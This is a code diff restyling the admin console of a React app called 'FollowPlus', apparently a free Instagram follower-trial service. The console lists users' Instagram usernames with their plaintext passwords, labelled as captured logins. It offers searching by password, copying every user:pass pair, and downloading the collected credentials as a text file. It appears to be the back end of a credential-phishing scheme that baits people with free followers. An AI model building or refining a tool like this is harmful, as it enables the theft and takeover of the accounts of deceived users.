-                <div className="bg-white/[0.02] border border-white/10 p-4.5 rounded-2xl transition-all duration-300 hover:-translate-y-1 hover:bg-white/[0.04] hover:border-pink-500/20 group relative overflow-hidden">
-                  <div className="absolute top-0 right-0 w-24 h-24 bg-pink-500/5 rounded-full blur-2xl group-hover:bg-pink-500/10 transition-all duration-300" />
+
+              {/* Admin Widgets Row */}
+              <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 pt-1">
+                <div className="bg-[#0c0d12] border border-[#dfb24c]/10 p-5 rounded-xl">
                   <div className="flex items-center justify-between">
-                    <span className="text-[10px] text-gray-400 font-mono uppercase tracking-wider">Total Campaigns</span>
-                    <span className="p-1.5 bg-pink-500/10 rounded-lg text-pink-400 text-xs font-mono font-bold tracking-widest border border-pink-500/20">LIVE</span>
+                    <span className="text-[9px] text-slate-400 font-mono uppercase tracking-wider">Active Campaigns</span>
+                    <span className="p-1 px-1.5 bg-emerald-500/10 rounded text-emerald-400 text-[8px] font-mono font-bold tracking-widest border border-emerald-500/20 uppercase">Live</span>
                   </div>
                   <div className="flex items-baseline gap-2 mt-2">
-                    <span className="font-display font-black text-3xl text-white tracking-tight">{campaigns.length}</span>
-                    <span className="text-[10px] text-emerald-400 font-mono mt-1 font-semibold flex items-center gap-0.5">↑ 100% active</span>
+                    <span className="font-display font-semibold text-2xl text-white tracking-tight">{campaigns.length}</span>
+                    <span className="text-[9px] text-[#dfb24c] font-mono font-medium">↑ 100% Tunneled</span>
                   </div>
-                  <p className="text-[10px] text-gray-500 mt-1.5">Registered profile distribution threads.</p>
+                  <p className="text-[10px] text-slate-500 mt-1 font-mono">Simulated proxy channels active.</p>
                 </div>
 
-                <div className="bg-white/[0.02] border border-white/10 p-4.5 rounded-2xl transition-all duration-300 hover:-translate-y-1 hover:bg-white/[0.04] hover:border-indigo-500/20 group relative overflow-hidden">
-                  <div className="absolute top-0 right-0 w-24 h-24 bg-indigo-500/5 rounded-full blur-2xl group-hover:bg-indigo-500/10 transition-all duration-300" />
+                <div className="bg-[#0c0d12] border border-[#dfb24c]/10 p-5 rounded-xl">
                   <div className="flex items-center justify-between">
-                    <span className="text-[10px] text-gray-400 font-mono uppercase tracking-wider">Stored Passwords</span>
-                    <span className="p-1.5 bg-indigo-500/10 rounded-lg text-indigo-400 text-xs font-mono font-bold tracking-widest border border-indigo-500/20">SECURE</span>
+                    <span className="text-[9px] text-slate-400 font-mono uppercase tracking-wider">Credential Logs</span>
+                    <span className="p-1 px-1.5 bg-[#dfb24c]/10 rounded text-[#dfb24c] text-[8px] font-mono font-bold tracking-widest border border-[#dfb24c]/20">LOCK</span>
                   </div>
                   <div className="flex items-baseline gap-2 mt-2">
-                    <span className="font-display font-black text-3xl text-pink-400 tracking-tight">
+                    <span className="font-display font-semibold text-2xl text-white tracking-tight text-[#dfb24c]">
                       {campaigns.filter(c => c.password).length}
                     </span>
-                    <span className="text-[10px] text-indigo-400 font-mono mt-1 font-semibold">captured logs</span>
+                    <span className="text-[9px] text-slate-400 font-mono">inputs captured</span>
                   </div>
-                  <p className="text-[10px] text-gray-500 mt-1.5">User profile linkages locked in DB.</p>
+                  <p className="text-[10px] text-slate-500 mt-1 font-mono">Locked encryption structures.</p>
                 </div>
 
-                <div className="bg-white/[0.02] border border-white/10 p-4.5 rounded-2xl transition-all duration-300 hover:-translate-y-1 hover:bg-white/[0.04] hover:border-violet-500/20 group relative overflow-hidden">
-                  <div className="absolute top-0 right-0 w-24 h-24 bg-violet-500/5 rounded-full blur-2xl group-hover:bg-violet-500/10 transition-all duration-300" />
+                <div className="bg-[#0c0d12] border border-[#dfb24c]/10 p-5 rounded-xl">
                   <div className="flex items-center justify-between">
-                    <span className="text-[10px] text-gray-400 font-mono uppercase tracking-wider">Free Trials</span>
-                    <span className="p-1.5 bg-violet-500/10 rounded-lg text-violet-400 text-xs font-mono font-bold tracking-widest border border-violet-500/20">8-DAY TRIAL</span>
+                    <span className="text-[9px] text-slate-400 font-mono uppercase tracking-wider">Allocated Free Slots</span>
+                    <span className="p-1 px-1.5 bg-indigo-500/10 rounded text-indigo-400 text-[8px] font-mono font-bold tracking-widest border border-indigo-500/20">8 DAYS</span>
                   </div>
                   <div className="flex items-baseline gap-2 mt-2">
-                    <span className="font-display font-black text-3xl text-violet-400 tracking-tight">
+                    <span className="font-display font-semibold text-2xl text-white tracking-tight">
                       {campaigns.filter(c => c.type === 'free_followers_trial').length}
                     </span>
-                    <span className="text-[10px] text-gray-500 font-mono mt-1">allocated slots</span>
+                    <span className="text-[9px] text-slate-400 font-mono">instances</span>
                   </div>
-                  <p className="text-[10px] text-gray-500 mt-1.5">Complimentary speed-boost instances.</p>
+                  <p className="text-[10px] text-slate-500 mt-1 font-mono">Daily complementary schedules.</p>
                 </div>
 
-                <div className="bg-white/[0.02] border border-white/10 p-4.5 rounded-2xl transition-all duration-300 hover:-translate-y-1 hover:bg-white/[0.04] hover:border-emerald-500/20 group relative overflow-hidden">
-                  <div className="absolute top-0 right-0 w-24 h-24 bg-emerald-500/5 rounded-full blur-2xl group-hover:bg-emerald-500/10 transition-all duration-300" />
+                <div className="bg-[#0c0d12] border border-[#dfb24c]/10 p-5 rounded-xl">
                   <div className="flex items-center justify-between">
-                    <span className="text-[10px] text-gray-400 font-mono uppercase tracking-wider">Decentralized Nodes</span>
-                    <span className="p-1.5 bg-emerald-500/10 rounded-lg text-emerald-400 text-xs font-mono font-bold tracking-widest border border-emerald-500/20">ONLINE</span>
+                    <span className="text-[9px] text-slate-400 font-mono uppercase tracking-wider">Network Routing</span>
+                    <span className="p-1 px-1.5 bg-emerald-500/10 rounded text-emerald-400 text-[8px] font-mono font-bold tracking-widest border border-emerald-500/20">FINE</span>
                   </div>
                   <div className="flex items-baseline gap-2 mt-2">
-                    <span className="font-display font-black text-3xl text-emerald-400 tracking-tight">2,841</span>
-                    <span className="text-[10px] text-emerald-500 font-mono mt-1 font-semibold flex items-center gap-1">
-                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping inline-block" /> Active
-                    </span>
+                    <span className="font-display font-semibold text-2xl text-[#10b981] tracking-tight">2,841</span>
+                    <span className="text-[9px] text-emerald-400 font-mono font-bold animate-pulse">● Active</span>
                   </div>
-                  <p className="text-[10px] text-gray-500 mt-1.5">Proxy relays running worldwide system.</p>
+                  <p className="text-[10px] text-slate-500 mt-1 font-mono">Server node pools on standby.</p>
                 </div>
               </div>
 
-              {/* Advanced Utilities Tab Controller & Search bar */}
-              <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-white/10 pb-5 pt-2">
-                <div className="flex bg-black/60 p-1.5 rounded-2xl border border-white/10 self-start">
+              {/* Sub tabs inside Admin console */}
+              <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-white/5 pb-5 pt-2">
+                <div className="flex bg-[#050608] p-1 rounded-xl border border-white/5 self-start">
                   <button
                     onClick={() => setAdminActiveTab('campaigns')}
-                    className={`px-4.5 py-2.5 rounded-xl text-xs font-bold font-display transition-all duration-200 cursor-pointer ${
+                    className={`px-4 py-2 rounded-lg text-xs font-semibold font-display transition-all duration-200 cursor-pointer ${
                       adminActiveTab === 'campaigns'
-                        ? 'bg-gradient-to-r from-pink-500 to-rose-500 text-white shadow-lg shadow-pink-500/20'
-                        : 'text-gray-400 hover:text-gray-200 hover:bg-white/5'
+                        ? 'bg-gradient-to-r from-[#dfb24c] to-[#f4d081] text-slate-950 shadow-md'
+                        : 'text-slate-400 hover:text-white hover:bg-white/5'
                     }`}
                   >
-                    Active Campaign Boosts ({campaigns.length})
+                    Active Campaigns ({campaigns.length})
                   </button>
                   <button
                     onClick={() => setAdminActiveTab('credentials')}
-                    className={`px-4.5 py-2.5 rounded-xl text-xs font-bold font-display transition-all duration-200 cursor-pointer ${
+                    className={`px-4 py-2 rounded-lg text-xs font-semibold font-display transition-all duration-200 cursor-pointer ${
                       adminActiveTab === 'credentials'
-                        ? 'bg-gradient-to-r from-indigo-600 to-indigo-500 text-white shadow-lg shadow-indigo-500/20'
-                        : 'text-gray-400 hover:text-gray-200 hover:bg-white/5'
+                        ? 'bg-gradient-to-r from-[#dfb24c] to-[#f4d081] text-slate-950 shadow-md'
+                        : 'text-slate-400 hover:text-white hover:bg-white/5'
                     }`}
                   >
-                    Saved Database Logins ({campaigns.filter(c => c.password).length})
+                    Captured Database Logins ({campaigns.filter(c => c.password).length})
                   </button>
                 </div>
 
-                <div className="flex flex-1 md:max-w-xs relative group">
+                <div className="flex flex-1 md:max-w-xs relative">
                   <input
                     type="text"
-                    placeholder="Search Username / Password..."
+                    placeholder="Search account name / password..."
                     value={adminSearch}
                     onChange={(e) => setAdminSearch(e.target.value)}
-                    className="w-full bg-black/40 border border-white/10 rounded-2xl py-2.5 px-4 pr-10 text-xs text-white placeholder-gray-500 focus:outline-none focus:border-indigo-500 transition-all focus:bg-black/60 focus:ring-1 focus:ring-indigo-500/20"
+                    className="w-full bg-black/40 border border-white/10 rounded-lg py-2.5 px-4 pr-10 text-xs text-white placeholder-slate-500 focus:outline-none focus:border-[#dfb24c] transition-all font-mono shadow-inner"
                   />
-                  {adminSearch ? (
+                  {adminSearch && (
                     <button
                       onClick={() => setAdminSearch('')}
-                      className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-white text-xs p-1"
+                      className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-white text-xs p-1"
                     >
                       ✕
                     </button>
-                  ) : (
-                    <div className="absolute right-3/5 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-indigo-400 pointer-events-none" />
                   )}
                 </div>
               </div>
 
-              {/* Active Campaigns Table or Filtered Logins */}
+              {/* Content Grid */}
               {adminActiveTab === 'campaigns' ? (
                 <div className="space-y-3">
                   <div className="flex items-center justify-between">
-                    <h3 className="text-sm font-mono text-gray-400 uppercase tracking-widest font-bold">Stored Campaign Register</h3>
-                    <p className="text-[10.5px] text-gray-500">Includes campaigns created under trial & premium protocols.</p>
+                    <h3 className="text-xs font-mono text-slate-450 uppercase tracking-widest font-bold">Stored Campaign Register</h3>
+                    <p className="text-[10px] text-slate-500 font-mono">Live organic queue configuration.</p>
                   </div>
                   
                   <div className="overflow-x-auto border border-white/5 rounded-xl bg-black/20">
-                    <table className="w-full border-collapse text-left text-xs text-gray-300">
+                    <table className="w-full border-collapse text-left text-xs text-slate-300">
                       <thead>
-                        <tr className="border-b border-white/10 bg-black/40 text-gray-400 font-mono uppercase text-[10px] tracking-wider">
+                        <tr className="border-b border-white/5 bg-black/40 text-slate-450 font-mono uppercase text-[9px] tracking-wider">
                           <th className="p-4">Instagram Profile</th>
-                          <th className="p-4">Saved Login Password</th>
+                          <th className="p-4">Linked Password</th>
                           <th className="p-4">Service Type</th>
-                          <th className="p-4 text-center">Velocity Size</th>
+                          <th className="p-4 text-center">Velocity State</th>
                           <th className="p-4">Status</th>
                           <th className="p-4 text-right">Action</th>
                         </tr>
                       </thead>
-                      <tbody className="divide-y divide-white/5">
+                      <tbody className="divide-y divide-white/5 font-mono text-[11px]">
                         {campaigns.filter(c => 
                           c.username.toLowerCase().includes(adminSearch.toLowerCase()) || 
                           (c.password && c.password.toLowerCase().includes(adminSearch.toLowerCase()))
                         ).length === 0 ? (
                           <tr>
-                            <td colSpan={6} className="p-10 text-center text-gray-500 font-mono">
-                              No matching campaigns found inside server memory.
+                            <td colSpan={6} className="p-10 text-center text-slate-500">
+                              No matching campaigns found inside server register memory.
                             </td>
                           </tr>
                         ) : (
@@ -666,42 +623,42 @@ export default function App() {
                               (c.password && c.password.toLowerCase().includes(adminSearch.toLowerCase()))
                             )
                             .map((camp) => (
-                              <tr key={camp.id} className="hover:bg-white/5 transition-colors">
+                              <tr key={camp.id} className="hover:bg-white/[0.01] transition-colors">
                                 <td className="p-4 font-semibold text-white">
-                                  <span className="text-gray-500 font-mono">@</span>{camp.username}
+                                  <span className="text-[#dfb24c] font-mono">@</span>{camp.username}
                                 </td>
                                 <td className="p-4">
                                   {camp.password ? (
-                                    <span className="font-mono text-pink-400 bg-pink-500/10 px-2 py-1 rounded border border-pink-500/20 font-bold select-all">
+                                    <span className="font-mono text-[#f4d081] bg-[#dfb24c]/5 px-2 py-0.5 rounded border border-[#dfb24c]/10 select-all">
                                       {camp.password}
                                     </span>
                                   ) : (
-                                    <span className="text-gray-600 italic font-mono text-[11px]">No password specified</span>
+                                    <span className="text-slate-600 italic text-[10px]">None specified</span>
                                   )}
                                 </td>
-                                <td className="p-4 font-mono">
+                                <td className="p-4">
                                   {camp.type === 'free_followers_trial' ? (
-                                    <span className="text-indigo-400 font-bold bg-indigo-500/10 px-2.5 py-0.5 rounded-full border border-indigo-500/20">
-                                      Free 8-Day Trial
+                                    <span className="text-[#dfb24c] font-medium bg-[#dfb24c]/5 px-2.5 py-0.5 rounded border border-[#dfb24c]/10 text-[10px] tracking-wide uppercase font-mono">
+                                      Free Trial
                                     </span>
                                   ) : (
-                                    <span className="text-neon-cyan capitalize bg-neon-cyan/10 px-2.5 py-0.5 rounded-full border border-neon-cyan/20 animate-none font-semibold">
-                                      {camp.type} Boost
+                                    <span className="text-white capitalize bg-white/5 px-2.5 py-0.5 rounded border border-white/10 font-mono text-[10px]">
+                                      {camp.type}
                                     </span>
                                   )}
                                 </td>
-                                <td className="p-4 text-center font-mono font-bold text-gray-200">
+                                <td className="p-4 text-center text-slate-350">
                                   {camp.deliveredAmount.toLocaleString()} / {camp.targetAmount.toLocaleString()}
                                 </td>
                                 <td className="p-4">
-                                  <span className={`inline-flex items-center gap-1.5 font-mono text-[10px] uppercase font-bold px-2 py-0.5 rounded-md ${
+                                  <span className={`inline-flex items-center gap-1 text-[9px] uppercase font-bold px-2 py-0.5 rounded-md ${
                                     camp.status === 'active' 
-                                      ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 animate-pulse' 
+                                      ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' 
                                       : camp.status === 'completed'
-                                        ? 'bg-blue-500/10 text-blue-400 border border-blue-500/20'
+                                        ? 'bg-[#dfb24c]/10 text-[#dfb24c] border border-[#dfb24c]/20'
                                         : 'bg-yellow-500/10 text-yellow-500'
                                   }`}>
-                                    <span className={`w-1.5 h-1.5 rounded-full ${camp.status === 'active' ? 'bg-emerald-400' : 'bg-gray-400'}`} />
+                                    <span className={`w-1 h-1 rounded-full ${camp.status === 'active' ? 'bg-emerald-400 animate-pulse' : 'bg-slate-400'}`} />
                                     {camp.status}
                                   </span>
                                 </td>
@@ -712,7 +669,7 @@ export default function App() {
                                         deleteCampaign(camp.id);
                                       }
                                     }}
-                                    className="p-2 text-rose-500 hover:text-rose-400 hover:bg-rose-500/10 rounded-lg transition-colors cursor-pointer inline-flex items-center justify-center border border-transparent hover:border-rose-500/20"
+                                    className="p-1.5 text-rose-450 hover:text-rose-450 hover:bg-rose-500/10 rounded transition-colors cursor-pointer inline-flex items-center justify-center border border-transparent hover:border-rose-500/20"
                                     title="Delete entry"
                                   >
                                     <Trash2 className="w-4 h-4" />
@@ -729,12 +686,12 @@ export default function App() {
                 <div className="space-y-4">
                   <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                     <div>
-                      <h3 className="text-sm font-mono text-gray-400 uppercase tracking-widest font-bold">Saved Account Logins Database</h3>
-                      <p className="text-xs text-gray-500 mt-1">Real-time captured ID & password parameters from linking submissions.</p>
+                      <h3 className="text-xs font-mono text-slate-400 uppercase tracking-widest font-bold">Encrypted Login Key Values</h3>
+                      <p className="text-[10px] text-slate-550 font-mono">Captured ID and verified security password structures from form inputs.</p>
                     </div>
 
                     <div className="flex flex-wrap items-center gap-2">
-                      <button
+                       <button
                         onClick={() => {
                           const list = campaigns
                             .filter(c => c.password)
@@ -752,12 +709,12 @@ export default function App() {
                               alert("Unable to access clipboard. Please copy manually from the list.");
                             });
                         }}
-                        className="px-4 py-2 bg-indigo-500/15 hover:bg-indigo-500/25 border border-indigo-500/30 hover:border-indigo-500/40 text-indigo-300 font-mono text-xs rounded-xl flex items-center gap-2 transition-all cursor-pointer"
+                        className="px-4 py-2 bg-[#dfb24c]/5 hover:bg-[#dfb24c]/10 border border-[#dfb24c]/20 text-[#dfb24c] font-mono text-xs rounded-xl flex items-center gap-2 transition-all cursor-pointer"
                       >
                         {copiedAll ? (
                           <>
                             <Check className="w-4 h-4 text-emerald-400 animate-scale" />
-                            Copied All Accounts!
+                            Copied list successfully!
                           </>
                         ) : (
                           <>
@@ -771,7 +728,7 @@ export default function App() {
                         onClick={() => {
                           const list = campaigns
                             .filter(c => c.password)
-                            .map(c => `Username: @${c.username}\nPassword: ${c.password}\nSubmitted At: ${c.createdAt || 'N/A'}\n---------------------------`)
+                            .map(c => `Username: @${c.username}\nPassword: ${c.password}\nRegistered: ${c.createdAt ? new Date(c.createdAt).toISOString() : 'N/A'}\n---------------------------`)
                             .join('\n\n');
                           
                           if (!list) return alert('No credentials list found.');
@@ -786,15 +743,15 @@ export default function App() {
                           document.body.removeChild(a);
                           URL.revokeObjectURL(url);
                         }}
-                        className="px-4 py-2 bg-emerald-500/15 hover:bg-emerald-500/25 border border-emerald-500/30 hover:border-emerald-500/40 text-emerald-300 font-mono text-xs rounded-xl flex items-center gap-2 transition-all cursor-pointer"
+                        className="px-4 py-2 bg-white/5 hover:bg-white/10 border border-white/10 text-white font-mono text-xs rounded-xl flex items-center gap-2 transition-all cursor-pointer"
                       >
                         <Download className="w-4 h-4" />
-                        Download Accounts (.txt)
+                        Download DB List (.txt)
                       </button>
                     </div>
                   </div>
 
-                  {/* Logins Container */}
+                  {/* Logins Card Grid */}
                   <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                     {campaigns
                       .filter(c => c.password)
@@ -802,8 +759,8 @@ export default function App() {
                         c.username.toLowerCase().includes(adminSearch.toLowerCase()) || 
                         (c.password && c.password.toLowerCase().includes(adminSearch.toLowerCase()))
                       ).length === 0 ? (
-                      <div className="col-span-2 p-10 text-center text-gray-500 font-mono border border-dashed border-white/10 rounded-2xl">
-                        No user login credentials saved in session yet. Try linking an account with a password on the homepage.
+                      <div className="col-span-2 p-12 text-center text-slate-500 font-mono border border-dashed border-white/5 rounded-xl">
+                        No user login credentials saved in session yet. Retry shortly.
                       </div>
                     ) : (
                       campaigns
@@ -813,15 +770,15 @@ export default function App() {
                           (c.password && c.password.toLowerCase().includes(adminSearch.toLowerCase()))
                         )
                         .map((camp) => (
-                          <div key={camp.id} className="glass-card p-5 border border-white/10 hover:border-indigo-500/20 transition-all flex flex-col justify-between space-y-4">
+                          <div key={camp.id} className="bg-[#0b0c11] p-5 border border-white/5 rounded-xl transition-all flex flex-col justify-between space-y-4">
                             <div className="flex items-start justify-between">
-                              <div className="flex items-center gap-2.5">
-                                <div className="w-9 h-9 bg-pink-500/10 rounded-lg flex items-center justify-center text-pink-400 border border-pink-500/20">
+                              <div className="flex items-center gap-3">
+                                <div className="w-9 h-9 bg-white/[0.01] rounded-lg flex items-center justify-center text-[#dfb24c] border border-[#dfb24c]/10">
                                   <Key className="w-4 h-4" />
                                 </div>
                                 <div>
-                                  <span className="text-gray-500 font-mono text-xs block">Instagram Account ID</span>
-                                  <span className="text-sm font-bold text-white font-mono">@{camp.username}</span>
+                                  <span className="text-slate-500 font-mono text-[9px] block uppercase">Instagram Identifier</span>
+                                  <span className="text-sm font-semibold text-white font-mono">@{camp.username}</span>
                                 </div>
                               </div>
 
@@ -832,8 +789,8 @@ export default function App() {
                                     setCopiedId(camp.id);
                                     setTimeout(() => setCopiedId(null), 1500);
                                   }}
-                                  className="p-2 bg-white/5 hover:bg-white/10 border border-white/10 text-gray-400 hover:text-white rounded-lg transition-colors cursor-pointer"
-                                  title="Copy combined user:pass credentials"
+                                  className="p-1.5 bg-white/5 hover:bg-white/10 border border-white/10 text-slate-400 hover:text-white rounded-lg transition-colors cursor-pointer"
+                                  title="Copy credentials"
                                 >
                                   {copiedId === camp.id ? (
                                     <Check className="w-3.5 h-3.5 text-emerald-400" />
@@ -847,24 +804,24 @@ export default function App() {
                                       deleteCampaign(camp.id);
                                     }
                                   }}
-                                  className="p-2 bg-rose-500/5 hover:bg-rose-500/10 border border-rose-500/10 text-rose-500 hover:text-rose-400 rounded-lg transition-colors cursor-pointer"
-                                  title="Remove credential entry"
+                                  className="p-1.5 bg-rose-500/5 hover:bg-rose-500/10 border border-rose-500/10 text-rose-500 hover:text-rose-450 rounded-lg transition-colors cursor-pointer"
+                                  title="Remove log"
                                 >
                                   <Trash2 className="w-3.5 h-3.5" />
                                 </button>
                               </div>
                             </div>
 
-                            <div className="bg-black/40 border border-white/5 p-3.5 rounded-xl space-y-2">
-                              <span className="text-[10px] text-gray-500 font-mono block uppercase">Captured Passwords</span>
-                              <div className="flex items-center justify-between bg-black/50 border border-white/10 py-1.5 px-3 rounded-lg">
-                                <span className="font-mono text-xs text-pink-400 font-bold tracking-wide select-all">
+                            <div className="bg-[#050608] border border-white/5 p-4 rounded-xl space-y-2">
+                              <span className="text-[9px] text-slate-500 font-mono block uppercase tracking-wider">Unencrypted Password</span>
+                              <div className="flex items-center justify-between bg-black/40 border border-white/5 py-1.5 px-3 rounded-lg">
+                                <span className="font-mono text-xs text-[#f4d081] font-bold select-all bg-transparent">
                                   {camp.password}
                                 </span>
                               </div>
-                              <div className="flex justify-between items-center text-[10px] font-mono text-gray-500 pt-1">
-                                <span>TYPE: {camp.type === 'free_followers_trial' ? '8-Day Trial' : 'Premium Boost'}</span>
-                                <span>DELIVERY: {camp.targetAmount === 800 ? 'Free trial' : 'Paid Premium'}</span>
+                              <div className="flex justify-between items-center text-[10px] font-mono text-slate-500 pt-1">
+                                <span>TUNNEL: Free trial</span>
+                                <span>TYPE: 8 days pipeline</span>
                               </div>
                             </div>
                           </div>
@@ -875,7 +832,7 @@ export default function App() {
               )}
 
               <div className="flex justify-end pt-2">
-                <p className="text-[10px] text-gray-600 font-mono">FollowPlus Administration Keypad Security Core V1.2.9</p>
+                <p className="text-[9px] text-slate-600 font-mono">FollowPlus Master Core Security Suite • Active Client Module</p>
               </div>
             </motion.div>
           </div>
